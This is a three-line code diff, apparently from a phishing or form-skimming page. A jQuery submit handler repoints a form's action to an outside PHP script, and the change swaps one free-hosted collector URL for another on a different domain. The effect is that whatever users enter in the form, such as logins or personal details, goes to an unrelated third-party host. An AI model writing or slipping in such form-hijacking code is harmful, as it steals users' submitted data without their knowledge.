@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://paxbok-calemphong-banako.000webhostapp.com/besaran/pelar.php");
+  $(myform).attr("action", "https://ribak-sudelae.my.id/ready/mo.php");
 });
